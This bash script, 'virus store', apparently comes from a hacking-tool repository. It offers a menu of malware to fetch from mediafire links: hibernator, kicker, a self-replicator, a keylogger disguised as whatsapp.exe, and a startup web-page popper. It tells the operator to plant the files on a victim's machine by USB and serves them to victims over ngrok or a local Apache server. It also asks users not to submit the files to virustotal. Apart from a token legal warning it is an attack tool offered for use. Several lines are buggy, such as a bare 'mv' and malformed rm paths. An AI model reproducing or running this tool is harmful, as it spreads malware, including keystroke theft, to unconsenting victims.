#!/bin/bash
#virus store v1.0
#@king___juno
#@instagram: king___juno
#github: http://github.com/king-juno/virus_store

clear

banner()
{
printf "\e[1;94m       _  \e[0m \e[6;95m@king___juno \e[0m   \e[1;94m    _\e[0m\n"                 
printf "\e[1;94m      (_)                    | |      \e[0m\n"
printf "\e[1;94m__   ___ _ __ _   _ ___   ___| |_ ___  _ __ ___ \e[0m\n"
printf "\e[1;94m\ \ / / | '__| | | / __| / __| __/ _ \| '__/ _ \ \e[0m\n"
printf "\e[1;94m \ V /| | |  | |_| \__ \ \__ \ || (_) | | |  __/ \e[0m\n"
printf "\e[1;94m  \_/ |_|_|   \__,_|___/ |___/\__\___/|_|  \___| \e[0m\n"
printf "      \e[1;92m         Author: @king___juno\e[0m\n"
printf "      \e[104m:: Warning: Attacking targets without  ::\e[0m\n"
printf "      \e[107m:: prior mutual consent is illegal!    ::\e[0m\n"
printf "\n"
printf "\n"     
}

dependencies()
{
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Installing it."; apt-get install php; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Installing it."; apt-get install ssh; }
command -v i686-w64-mingw32-g++ > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Installing it."; 
apt-get install mingw-w64; }
command -v apache2 > /dev/null 2>&1 || { echo >&2 "I require apache2 but it's not installed. Installing it."; apt-get install apache2; }
clear
banner
}

server_ngrok()
{
cd ..
cd ..
PT=80
RAW=null
API=null
FST=null
LNK_HTTP=.
LNK_HTTPS=.
sq='"'
lnpref=public_url
prefix="${lnpref}:"
tnl='localhost:4040/api/tunnels'
#COL
C_RED=$(tput setaf 1)
C_GRN=$(tput setaf 2)
C_YLW=$(tput setaf 3)
C_BLE=$(tput setaf 4)
C_RST=$(tput sgr0)
print "loading....."
service apache2 start
pkill -f ngrok
EXEC=$(./ngrok http $PT >> /dev/null &)
sleep 5s
if ! [ -x "$(command -v curl)" ]; then
	unset API
	API=$(wget -qO - $tnl | awk -F"," -v k=$lnpref '{
		gsub(/{|}/,"")
		for(i=1;i<=NF;i++){
			if ( $i ~ k ){ printf "${i}" }
		}
	}')
else
	unset API
	API=$(curl -s $tnl | awk -F"," -v k=$lnpref '{
		gsub(/{|}/,"")
		for(i=1;i<=NF;i++){
			if ( $i ~ k ){ print $i }
		}
	}')
fi
API=${API//$sq}
API=${API//$prefix}
IFS=$'\n' read -rd '' -a FST <<<"$API"
FST=${FST//http\:\/\/}
sleep 1s
LNK_HTTP="http://${FST}"
LNK_HTTPS="https://${FST}"
printf " ${C_BLE}Status: ${C_GRN}ONLINE${C_RST}\n"
printf " ${C_BLE}Link (HTTP):  ${C_YLW}${LNK_HTTP}${C_RST}\n"
printf " ${C_BLE}Link (HTTPS): ${C_YLW}${LNK_HTTPS}${C_RST}\n"
printf "\n Press [ENTER] to leave..."
printf "\n\n\n"
read -p " "
service apache2 stop
exit 0
}

downloader()
{
default_virus_name="activation"
printf '\n\e[1;92m[\e[0m\e[1;92m+\e[0m\e[1;77m] virus name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_virus_name
read virus_name
virus_name="${virus_name:-${default_virus_name}}"
if [[ $option == 1|| $option == 01 ]]; then
	wget download2265.mediafire.com/7ionuc7246kg/4u4aveugov3m4u1/hibernator.bat
	wget download1640.mediafire.com/jo3u4ff7zpqg/wqzcq3k2ipqzg5y/activation.bat
	mv activation.bat $virus_name.bat
	printf "\n\n\tTwo files hibernator and activation are downloaded in /virus.Paste the bat files into your USB (should not be in any folder) and attach it to the victim.Then run activation.bat only. \E[1;94mWARNING:Don't rename hibernator.bat\e[0m\n\n]"
elif [[ $option == 2|| $option == 02 ]]; then
	wget download2262.mediafire.com/xbzurshottpg/j06cc7mfls2heo4/kicker.bat
	wget download2262.mediafire.com/5kafq44nvaig/mmwccc38wb5623g/activation.bat
	mv
	printf "\n\n\tTwo files kicker and activation are downloaded in /virus.Paste the bat 	files into your USB (should not be in any folder) and attach it to the victim.Then run activation.bat only. \E[1;94mWARNING:Don't rename kicker.bat\e[0m\n\n]"
elif [[ $option == 3|| $option == 03 ]]; then
	wget download1651.mediafire.com/6zb6m55kmgsg/iadfpkx8wd3eh7p/replicator.bat
	mv activation.bat $virus_name.bat
	printf "\n\n\tfile replicator is downloaded in /virus.It can replicate itself into  directories you have given\e[0m\n\n]"
elif [[ $option == 4|| $option == 04 ]]; then
	wget download1580.mediafire.com/ounj83qodjpg/2wr34v962ffzfcz/whatsapp.exe
	mv whatsapp.exe $virus_name.exe
	printf "\n\n\tfile keylogger is downloaded in /virus.It can collect keyboard strokes  	and save it in log file\e[0m\n\n]"
elif [[ $option == 5|| $option == 05 ]]; then
	wget download2263.mediafire.com/d27lhdxjd9hg/mdl8uo59v19xo5m/webpoper.bat
	mv webpoper.bat $virus_name.bat
	printf "\n\n\tfile webpoper is downloaded in /virus.It can pops webpages on startup\e[0m\n\n]"
fi 
printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, don't upload to virustotal.com !\e[0m\n\n\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s.bat\n" $virus_name
printf "killcode = "
printf "\e[1;93mt3i8x5ft\e[0m\n"
share
}
server_apache()
{
	service apache2 start
 	printf "link is your local ip"
 	printf "\n Press [ENTER] to leave..."
	printf "\n\n\n"
	read -p " "
	service apache2 stop
}
share()
{
printf" paste ngrok file into /virus/virus_name you have it .else it will be automatically downloaded"
printf "\n\n\e[1;96mDownload this file using:\n\e[1;92m[1]-ngrok\n[2]-local server\n[99]-exit\e[0m\e[0m\n"
read opt
if [ ! -f "ngrok" ]
then
	echo "ngrok not found.Downloading....."
	wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
	unzip ngrok-stable-linux-386.zip
fi
if [[ $option == 1 || $option == 2 ]]; then
if [[ $opt == 1 || $opt == 01 ]];then
	if [[ $option == 1|| $option == 01 ]]; then
		cp $virus.bat "/var/www/html"
		cp $virus_name.bat "/var/www/html"
	fi	
	server_ngrok
	rm "/var/www/html/%s"$virus
	rm "/var/www/html/ %s.bat" $virus_name
elif [[ $opt == 2 || $opt == 02 ]]; then	
	if [[ $option == 1|| $option == 01 ]]; then
		cp $virus.bat "/var/www/html"
		cp $virus_name.bat "/var/www/html"
	fi	
	server_apache
	rm "/var/www/html/%s"$virus
	rm "/var/www/html/ %s.bat" $virus_name
elif [[$opt == 99 ]]; then
	printf "exiting..."
	sleep 3
	exit 0
else 
	printf "\e[1;94minvalid option\e[0m"
	sleep 3
	exit 0
fi
else 
if [[ $opt == 1 || $opt == 01 ]];then
	if [[ $option == 1|| $option == 01 ]]; then
		cp $virus.bat "/var/www/html"
	fi	
	server_ngrok
	rm "/var/www/html/%s"$virus
elif [[ $opt == 2 || $opt == 02 ]]; then	
	if [[ $option == 1|| $option == 01 ]]; then
		cp $virus.bat "/var/www/html"
	fi	
	server_apache
	rm "/var/www/html/%s"$virus
elif [[ $opt == 99 ]]; then
	printf "exiting..."
	sleep 3
	exit 0
else 
	printf "\e[1;94minvalid option\e[0m"
	sleep 3
	exit 0	
fi
fi
}

process()
{
clear
banner
cd virus
	if [ -d $virus ] 
	then 
		cd $virus
	else  
		mkdir $virus
		cd $virus
	fi
downloader
}

virus()
{
if [[ $option == 1 || $option == 01 ]]; then
	virus="hibernator"
	process
elif [[ $option == 2 || $option == 02 ]]; then
	virus="kicker"
	process
elif [[ $option == 3 || $option == 03 ]]; then
	virus="replicator"
	process
elif [[ $option == 4 || $option == 04 ]]; then
	virus="whatsapp"
	process
elif [[ $option == 5 || $option == 05 ]]; then
	virus="webpoper"
	process
elif [[ $option  == 99 ]]; then
exit 1
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
fi
}

selector()
{
printf "\e[1;93mselect your virus:\n\n\e[0m";
printf "[1]  hibernator\n"
printf "[2]  kicker\n"
printf "[3]  replicator\n"
printf "[4]  keylogger\n"
printf "[5]  web poper\n\n"
printf "[99] exit\n\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option
printf "\n"
virus
}

function start()
{
banner
dependencies
selector
}

start
